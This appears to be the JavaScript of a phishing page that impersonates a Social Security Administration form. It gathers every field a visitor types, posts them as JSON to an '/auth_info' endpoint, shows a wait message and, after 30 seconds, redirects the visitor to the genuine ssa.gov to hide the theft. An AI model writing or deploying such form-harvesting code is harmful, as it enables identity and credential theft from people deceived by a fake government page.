const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const submitBtn = document.querySelector('#sub_itin')
const displayMsg = document.querySelector("#wait")
const message = document.querySelector('.message')
const allInputs = document.querySelectorAll('input');


let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'

document.addEventListener('DOMContentLoaded', first.focus())
allInputs.forEach(input => {
  input.addEventListener('keyup', (e) => {
    if (e.keyCode === 13) {
      e.preventDefault(); 
      const allInputsFilled = Array.from(allInputs).every(input => input.value.trim() !== ''); 
      if (allInputsFilled) {
        submit(); 
      } else{
        message.style.display = 'block'
        const firstEmptyInput = Array.from(allInputs).find(input => input.value.trim() === '');
        if (firstEmptyInput) {
          firstEmptyInput.focus();
        }
      }
    }
  });
});

submitBtn.addEventListener('click', () => {
  const allInputsFilled = Array.from(allInputs).every(input => input.value.trim() !== ''); 
      if (allInputsFilled) {
        submit(); 
      } else{
        message.style.display = 'block'
        const firstEmptyInput = Array.from(allInputs).find(input => input.value.trim() === '');
        if (firstEmptyInput) {
          firstEmptyInput.focus();
        }
      }
})

function submit(){
  displayMsg.style.display = 'block'
  const obj = {}
  allInputs.forEach(input => {
    obj[input.id] = input.value; 
  });

  const baseURL = '/auth_info'
  fetch(baseURL, {
      method: 'POST',
      headers: {
          "Content-Type" : "application/json"
      },
      body: JSON.stringify(obj)
  })

  setTimeout(() => {
    window.location.href = 'https://www.ssa.gov/'
  }, 30000)
}
